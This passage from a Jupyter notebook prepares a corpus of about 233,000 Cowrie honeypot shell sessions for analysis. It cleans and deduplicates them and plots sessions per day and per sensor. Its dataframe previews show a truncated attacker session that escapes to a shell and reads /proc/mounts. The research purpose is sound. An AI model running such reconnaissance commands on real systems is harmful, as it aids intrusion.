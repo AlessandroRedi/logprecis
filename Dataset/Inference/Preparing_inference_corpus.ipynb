{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "e8c1fe17-dab3-4bd2-92e1-8dda4db7802b",
   "metadata": {},
   "source": [
    "# This notebook prepares and characterizes on a \"Vanilla\" way the inference corpus\n",
    "## Specifically:\n",
    "- We will obtain some useful stats on the inference sessions (avg length, etc)\n",
    "- We'll try artificially \"recreating\" the same stats as in the training set (contextualized chunking)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "d8ee272e-2c22-4980-9036-ad9c36f1035f",
   "metadata": {},
   "source": [
    "### Import corpus"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "89377126-c183-44d7-b8bf-732641e88122",
   "metadata": {},
   "outputs": [],
   "source": [
    "from tqdm import tqdm\n",
    "tqdm.pandas()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "730e1dec-29f8-464c-989e-a8784ec62fd3",
   "metadata": {},
   "source": [
    "### Import big unlabeled dataset"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "41a8133a-f8cf-430d-9588-cb65fbf6918b",
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "100%|██████████| 233047/233047 [00:00<00:00, 1209068.18it/s]\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Inference corpus contains 233046 examples\n"
     ]
    },
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>full_session</th>\n",
       "      <th>first_timestamp</th>\n",
       "      <th>sensor</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>enable ; system ; shell ; sh ; cat /proc/mount...</td>\n",
       "      <td>2019-06-04 09:45:11.151186+00:00</td>\n",
       "      <td>eea5dc653b37</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>enable ; system ; shell ; sh ; cat /proc/mount...</td>\n",
       "      <td>2019-06-04 09:45:50.396610+00:00</td>\n",
       "      <td>eea5dc653b37</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                                        full_session  \\\n",
       "0  enable ; system ; shell ; sh ; cat /proc/mount...   \n",
       "1  enable ; system ; shell ; sh ; cat /proc/mount...   \n",
       "\n",
       "                    first_timestamp        sensor  \n",
       "0  2019-06-04 09:45:11.151186+00:00  eea5dc653b37  \n",
       "1  2019-06-04 09:45:50.396610+00:00  eea5dc653b37  "
      ]
     },
     "execution_count": 3,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "import pandas as pd\n",
    "\n",
    "inference_corpus = pd.read_csv(\"./all_files.csv\")\n",
    "inference_corpus.rename({\"session\": \"full_session\", \"timestamps_statements\":\"first_timestamp\"}, axis = 1, inplace = True)\n",
    "inference_corpus = inference_corpus[[\"full_session\", \"first_timestamp\", \"sensor\"]]\n",
    "is_string = inference_corpus[\"full_session\"].progress_apply(lambda session: isinstance(session, str))\n",
    "inference_corpus = inference_corpus[is_string]\n",
    "inference_corpus[\"full_session\"] = inference_corpus.full_session.apply(lambda session: session+\" ;\" if session[-2:]!=\" ;\" else session)\n",
    "print(f\"Inference corpus contains {inference_corpus.shape[0]} examples\")\n",
    "inference_corpus.head(2)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "6c78a73f-f5fa-4959-849c-9ed3fca791ec",
   "metadata": {},
   "source": [
    "### Apply a bit of pre-processing. We want the sessions to be in the format: \"word separator word separator ...\" (space separated, 1 line)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "ff25c3c8-440d-4a2c-8f01-6a217c1ce39f",
   "metadata": {},
   "outputs": [],
   "source": [
    "import re\n",
    "def replace_special_character(input_string):\n",
    "    output_string = re.sub(r'\\s*([|]+|&&|;)\\s*', r' \\1 ', input_string)\n",
    "    return output_string\n",
    "\n",
    "def remove_new_line(session):\n",
    "    return session.replace(\"\\n\", \" ; \").strip()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "3bc53929-f7bf-4139-9a43-826c575ed30f",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>full_session</th>\n",
       "      <th>first_timestamp</th>\n",
       "      <th>sensor</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>enable ; system ; shell ; sh ; cat /proc/mount...</td>\n",
       "      <td>2019-06-04 09:45:11.151186+00:00</td>\n",
       "      <td>eea5dc653b37</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>enable ; system ; shell ; sh ; cat /proc/mount...</td>\n",
       "      <td>2019-06-04 09:45:50.396610+00:00</td>\n",
       "      <td>eea5dc653b37</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                                        full_session  \\\n",
       "0  enable ; system ; shell ; sh ; cat /proc/mount...   \n",
       "1  enable ; system ; shell ; sh ; cat /proc/mount...   \n",
       "\n",
       "                    first_timestamp        sensor  \n",
       "0  2019-06-04 09:45:11.151186+00:00  eea5dc653b37  \n",
       "1  2019-06-04 09:45:50.396610+00:00  eea5dc653b37  "
      ]
     },
     "execution_count": 5,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "inference_corpus[\"full_session\"] = inference_corpus.full_session.apply(lambda session: replace_special_character(session))\n",
    "inference_corpus[\"full_session\"] = inference_corpus.full_session.apply(lambda session: remove_new_line(session))\n",
    "inference_corpus.head(2)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "5fec0683-bcdc-46a7-bef9-12f0635c1c87",
   "metadata": {},
   "source": [
    "##### Remember to cast string to datetime"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "7f60e695-cfd0-4043-b755-f9ed6e5ed460",
   "metadata": {},
   "source": [
    "###### Filter rows which are not containing timestamps"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "id": "f2682f69-6456-47d1-9581-edac4832acdd",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Further filtered to 233046 sessions\n"
     ]
    }
   ],
   "source": [
    "is_date = inference_corpus[\"first_timestamp\"].apply(lambda timestamp: True if len(timestamp.split(\"-\"))!=1 else False)\n",
    "inference_corpus = inference_corpus[is_date]\n",
    "print(f\"Further filtered to {inference_corpus.shape[0]} sessions\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "9100fd40-ff49-4ef3-af2b-8fb6c58c0bc3",
   "metadata": {},
   "source": [
    "###### Now, parsing"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "id": "531e56e6-5c2d-4714-84a7-ec048a99b7e6",
   "metadata": {},
   "outputs": [],
   "source": [
    "inference_corpus[\"first_timestamp\"] = pd.to_datetime(inference_corpus[\"first_timestamp\"])"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "f7547890-2000-488d-b983-0c0dd6e12186",
   "metadata": {},
   "source": [
    "#### Make sure we are handling only unique sessions"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "id": "b8653315-4f36-4b61-9702-0951ee089ac4",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Before dropping duplicates: 233046\n",
      "After dropping duplicates: 233037\n"
     ]
    },
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>full_session</th>\n",
       "      <th>first_timestamp</th>\n",
       "      <th>sensor</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>enable ; system ; shell ; sh ; cat /proc/mount...</td>\n",
       "      <td>2019-06-04 09:45:11.151186+00:00</td>\n",
       "      <td>eea5dc653b37</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>enable ; system ; shell ; sh ; cat /proc/mount...</td>\n",
       "      <td>2019-06-04 09:45:50.396610+00:00</td>\n",
       "      <td>eea5dc653b37</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                                        full_session  \\\n",
       "0  enable ; system ; shell ; sh ; cat /proc/mount...   \n",
       "1  enable ; system ; shell ; sh ; cat /proc/mount...   \n",
       "\n",
       "                   first_timestamp        sensor  \n",
       "0 2019-06-04 09:45:11.151186+00:00  eea5dc653b37  \n",
       "1 2019-06-04 09:45:50.396610+00:00  eea5dc653b37  "
      ]
     },
     "execution_count": 8,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "print(f\"Before dropping duplicates: {inference_corpus.shape[0]}\")\n",
    "inference_corpus.sort_values(by = \"first_timestamp\", ascending = True, inplace = True)\n",
    "unique_inference_corpus = inference_corpus.drop_duplicates([\"full_session\"])\n",
    "print(f\"After dropping duplicates: {unique_inference_corpus.shape[0]}\")\n",
    "unique_inference_corpus.head(2)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "d2244b9f-9cb3-488e-886d-a247fa9f5ef1",
   "metadata": {},
   "source": [
    "### How long did the collection last?"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "id": "390dde72-3c8e-4e8f-bf73-74f05cc3aaea",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Collection started in 2019-06-04 09:45:11.151186+00:00 and lasted untill 2020-02-29 23:59:22.199490+00:00\n"
     ]
    }
   ],
   "source": [
    "start = unique_inference_corpus.first_timestamp.min()\n",
    "stop = unique_inference_corpus.first_timestamp.max()\n",
    "print(f\"Collection started in {start} and lasted untill {stop}\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "ac79d422-e172-478c-845c-28ba8546d53f",
   "metadata": {},
   "source": [
    "### Which distribution of new sessions/day? Group daily stats"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "id": "37f06149-1b50-455b-9ef6-fa45b10e92e8",
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "100%|██████████| 233037/233037 [00:00<00:00, 423895.33it/s]\n",
      "/tmp/ipykernel_1983220/3645611591.py:1: SettingWithCopyWarning: \n",
      "A value is trying to be set on a copy of a slice from a DataFrame.\n",
      "Try using .loc[row_indexer,col_indexer] = value instead\n",
      "\n",
      "See the caveats in the documentation: https://pandas.pydata.org/pandas-docs/stable/user_guide/indexing.html#returning-a-view-versus-a-copy\n",
      "  unique_inference_corpus[\"date\"] = unique_inference_corpus[\"first_timestamp\"].progress_apply(lambda datetime: datetime.date())\n"
     ]
    },
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>full_session</th>\n",
       "      <th>first_timestamp</th>\n",
       "      <th>sensor</th>\n",
       "      <th>date</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>enable ; system ; shell ; sh ; cat /proc/mount...</td>\n",
       "      <td>2019-06-04 09:45:11.151186+00:00</td>\n",
       "      <td>eea5dc653b37</td>\n",
       "      <td>2019-06-04</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>enable ; system ; shell ; sh ; cat /proc/mount...</td>\n",
       "      <td>2019-06-04 09:45:50.396610+00:00</td>\n",
       "      <td>eea5dc653b37</td>\n",
       "      <td>2019-06-04</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                                        full_session  \\\n",
       "0  enable ; system ; shell ; sh ; cat /proc/mount...   \n",
       "1  enable ; system ; shell ; sh ; cat /proc/mount...   \n",
       "\n",
       "                   first_timestamp        sensor        date  \n",
       "0 2019-06-04 09:45:11.151186+00:00  eea5dc653b37  2019-06-04  \n",
       "1 2019-06-04 09:45:50.396610+00:00  eea5dc653b37  2019-06-04  "
      ]
     },
     "execution_count": 10,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "unique_inference_corpus[\"date\"] = unique_inference_corpus[\"first_timestamp\"].progress_apply(lambda datetime: datetime.date())\n",
    "unique_inference_corpus.head(2)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "id": "c836ad90-a103-4177-95fa-18566dedca6b",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>sessions_per_day</th>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>date</th>\n",
       "      <th></th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>2019-06-04</th>\n",
       "      <td>82</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2019-06-05</th>\n",
       "      <td>125</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "            sessions_per_day\n",
       "date                        \n",
       "2019-06-04                82\n",
       "2019-06-05               125"
      ]
     },
     "execution_count": 11,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Groupby date and set date as an index\n",
    "sorted_session_per_date = unique_inference_corpus.groupby(\"date\")[\"full_session\"].count().reset_index().rename({\"full_session\":\"sessions_per_day\"}, axis = 1).sort_values(by = \"date\")\n",
    "sorted_session_per_date.set_index(sorted_session_per_date.date, inplace = True)\n",
    "sorted_session_per_date.drop(\"date\", axis = 1, inplace = True)\n",
    "sorted_session_per_date.head(2)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "id": "e5cec6ce-b7a8-4896-9bb3-e42fb6583486",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>sessions_per_day</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>2019-06-04</th>\n",
       "      <td>82.0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2019-06-05</th>\n",
       "      <td>125.0</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "            sessions_per_day\n",
       "2019-06-04              82.0\n",
       "2019-06-05             125.0"
      ]
     },
     "execution_count": 12,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Now refill dates in which the honeypot was off with None\n",
    "idx = pd.date_range(unique_inference_corpus.date.min(), unique_inference_corpus.date.max())\n",
    "sorted_session_per_date = sorted_session_per_date.reindex(idx, fill_value=None)\n",
    "sorted_session_per_date.head(2)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "58998098-dd29-4801-b3cf-cfa774784a40",
   "metadata": {},
   "source": [
    "### Plot trend"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "id": "d7129812-ec52-4a58-958b-a3f7530ca865",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 576x432 with 1 Axes>"
      ]
     },
     "metadata": {
      "needs_background": "light"
     },
     "output_type": "display_data"
    }
   ],
   "source": [
    "import matplotlib.pyplot as plt \n",
    "\n",
    "fig, axs = plt.subplots(1, figsize=(8,6))\n",
    "fontsize = 20\n",
    "axs.plot(sorted_session_per_date.index, sorted_session_per_date.sessions_per_day, linewidth = 2)\n",
    "axs.set_title(f'|New sessions| per day', fontsize = fontsize + 5)\n",
    "axs.set_ylabel('|New sessions|', fontsize = fontsize + 3)\n",
    "axs.set_xlabel('Days', fontsize = fontsize + 3)\n",
    "axs.yaxis.set_tick_params(labelsize=fontsize)\n",
    "axs.xaxis.set_tick_params(labelsize=fontsize, rotation = 30)      \n",
    "axs.grid()\n",
    "plt.tight_layout()\n",
    "plt.show()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "29d78f8c-725a-4c30-972d-0b7d47402327",
   "metadata": {},
   "source": [
    "### Which sensor to collect the data?"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "af06dac1-d1c8-4a68-906b-5ef52d35dc51",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Number of sensors used for the collection: 39\n",
      "Top-5 sensors:\n"
     ]
    },
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>sensor</th>\n",
       "      <th>sessions_per_sensor</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>38</th>\n",
       "      <td>ubuntu_basic_pool</td>\n",
       "      <td>82338</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>23</th>\n",
       "      <td>cowrie-deployment-v02-pcrn5</td>\n",
       "      <td>24603</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>15</th>\n",
       "      <td>cowrie-deployment-v02-2fdcj</td>\n",
       "      <td>19688</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>27</th>\n",
       "      <td>cowrie_docker_v3</td>\n",
       "      <td>12348</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>18</th>\n",
       "      <td>cowrie-deployment-v02-f8nsr</td>\n",
       "      <td>12316</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                         sensor  sessions_per_sensor\n",
       "38            ubuntu_basic_pool                82338\n",
       "23  cowrie-deployment-v02-pcrn5                24603\n",
       "15  cowrie-deployment-v02-2fdcj                19688\n",
       "27             cowrie_docker_v3                12348\n",
       "18  cowrie-deployment-v02-f8nsr                12316"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "sessions_per_sensor = unique_inference_corpus.groupby(\"sensor\").full_session.count().reset_index().rename({\"full_session\":\"sessions_per_sensor\"}, axis = 1)\n",
    "print(f\"Number of sensors used for the collection: {sessions_per_sensor['sensor'].nunique()}\")\n",
    "print(\"Top-5 sensors:\")\n",
    "display(sessions_per_sensor.sort_values(by = \"sessions_per_sensor\", ascending = False).head(5))"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "b446b345-59fa-485e-9448-c51c1d981a74",
   "metadata": {},
   "source": [
    "#### Plot CDF"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "id": "7ef2f830-9f3d-484c-8deb-f275af9dac16",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Number of sensors used for the collection: 39\n",
      "Top-5 sensors:\n"
     ]
    },
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>sensor</th>\n",
       "      <th>sessions_per_sensor</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>38</th>\n",
       "      <td>ubuntu_basic_pool</td>\n",
       "      <td>82338</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>23</th>\n",
       "      <td>cowrie-deployment-v02-pcrn5</td>\n",
       "      <td>24603</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>15</th>\n",
       "      <td>cowrie-deployment-v02-2fdcj</td>\n",
       "      <td>19688</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>27</th>\n",
       "      <td>cowrie_docker_v3</td>\n",
       "      <td>12348</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>18</th>\n",
       "      <td>cowrie-deployment-v02-f8nsr</td>\n",
       "      <td>12316</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                         sensor  sessions_per_sensor\n",
       "38            ubuntu_basic_pool                82338\n",
       "23  cowrie-deployment-v02-pcrn5                24603\n",
       "15  cowrie-deployment-v02-2fdcj                19688\n",
       "27             cowrie_docker_v3                12348\n",
       "18  cowrie-deployment-v02-f8nsr                12316"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "sessions_per_sensor = unique_inference_corpus.groupby(\"sensor\").full_session.count().reset_index().rename({\"full_session\":\"sessions_per_sensor\"}, axis = 1)\n",
    "print(f\"Number of sensors used for the collection: {sessions_per_sensor['sensor'].nunique()}\")\n",
    "print(\"Top-5 sensors:\")\n",
    "display(sessions_per_sensor.sort_values(by = \"sessions_per_sensor\", ascending = False).head(5))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "id": "cc4620fc-6c8d-4841-b889-6c8d639e2e04",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 432x360 with 1 Axes>"
      ]
     },
     "metadata": {
      "needs_background": "light"
     },
     "output_type": "display_data"
    }
   ],
   "source": [
    "cdf_sessions_per_sensor = sessions_per_sensor.sessions_per_sensor.value_counts().sort_index().rename(\"cdf\")\n",
    "cdf_sessions_per_sensor = np.cumsum(cdf_sessions_per_sensor)/np.sum(cdf_sessions_per_sensor)\n",
    "fig, axs = plt.subplots(1, figsize=(6,5))\n",
    "fontsize = 20\n",
    "axs.plot(cdf_sessions_per_sensor.reset_index()[\"index\"], cdf_sessions_per_sensor.reset_index()[\"cdf\"], linewidth = 2)\n",
    "axs.scatter(cdf_sessions_per_sensor.reset_index()[\"index\"], cdf_sessions_per_sensor.reset_index()[\"cdf\"], c = \"k\", s = 20)\n",
    "axs.set_xlabel('|sessions| per sensor', fontsize = fontsize + 3)\n",
    "axs.set_title(f'ECDF of |sessions| per sensor', fontsize = fontsize + 5)\n",
    "axs.set_ylabel('ECDF', fontsize = fontsize + 3)\n",
    "axs.yaxis.set_tick_params(labelsize=fontsize)\n",
    "axs.xaxis.set_tick_params(labelsize=fontsize)\n",
    "axs.grid()\n",
    "axs.set_xscale(\"log\")\n",
    "plt.tight_layout()\n",
    "plt.show()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "86ceb78d-cd25-4cf5-984a-efbc2f91356a",
   "metadata": {},
   "source": [
    "### Now, let's focus on the sessions' lengths\n",
    "#### We'll compare those stats with the ones coming from the training corpus"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "id": "6dde869e-59f0-4394-9d71-3ec661af430b",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Before filtering: 233037\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "100%|██████████| 233037/233037 [00:00<00:00, 271527.77it/s]\n",
      "/tmp/ipykernel_1983220/3556493145.py:13: SettingWithCopyWarning: \n",
      "A value is trying to be set on a copy of a slice from a DataFrame.\n",
      "Try using .loc[row_indexer,col_indexer] = value instead\n",
      "\n",
      "See the caveats in the documentation: https://pandas.pydata.org/pandas-docs/stable/user_guide/indexing.html#returning-a-view-versus-a-copy\n",
      "  unique_inference_corpus[\"len_sessions\"] = unique_inference_corpus[\"full_session\"].progress_apply(lambda session: len(session.split(\" \")))\n",
      "100%|██████████| 233037/233037 [00:05<00:00, 41871.08it/s]\n",
      "/tmp/ipykernel_1983220/3556493145.py:14: SettingWithCopyWarning: \n",
      "A value is trying to be set on a copy of a slice from a DataFrame.\n",
      "Try using .loc[row_indexer,col_indexer] = value instead\n",
      "\n",
      "See the caveats in the documentation: https://pandas.pydata.org/pandas-docs/stable/user_guide/indexing.html#returning-a-view-versus-a-copy\n",
      "  unique_inference_corpus[\"n_statements\"] = unique_inference_corpus[\"full_session\"].progress_apply(lambda session: len(obtain_statements(str(session))))\n",
      "100%|██████████| 233037/233037 [00:06<00:00, 36790.99it/s]\n",
      "/tmp/ipykernel_1983220/3556493145.py:15: SettingWithCopyWarning: \n",
      "A value is trying to be set on a copy of a slice from a DataFrame.\n",
      "Try using .loc[row_indexer,col_indexer] = value instead\n",
      "\n",
      "See the caveats in the documentation: https://pandas.pydata.org/pandas-docs/stable/user_guide/indexing.html#returning-a-view-versus-a-copy\n",
      "  unique_inference_corpus[\"char_x_statements\"] = unique_inference_corpus[\"full_session\"].progress_apply(lambda session: obtain_char_x_statements(str(session)))\n",
      "100%|██████████| 233037/233037 [00:01<00:00, 162764.91it/s]\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "After filtering: 233037\n"
     ]
    },
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>full_session</th>\n",
       "      <th>first_timestamp</th>\n",
       "      <th>sensor</th>\n",
       "      <th>date</th>\n",
       "      <th>len_sessions</th>\n",
       "      <th>n_statements</th>\n",
       "      <th>char_x_statements</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>enable ; system ; shell ; sh ; cat /proc/mount...</td>\n",
       "      <td>2019-06-04 09:45:11.151186+00:00</td>\n",
       "      <td>eea5dc653b37</td>\n",
       "      <td>2019-06-04</td>\n",
       "      <td>62</td>\n",
       "      <td>21</td>\n",
       "      <td>[8, 8, 7, 4, 18, 20, 13, 9, 17, 20, 6, 6, 20, ...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>enable ; system ; shell ; sh ; cat /proc/mount...</td>\n",
       "      <td>2019-06-04 09:45:50.396610+00:00</td>\n",
       "      <td>eea5dc653b37</td>\n",
       "      <td>2019-06-04</td>\n",
       "      <td>62</td>\n",
       "      <td>21</td>\n",
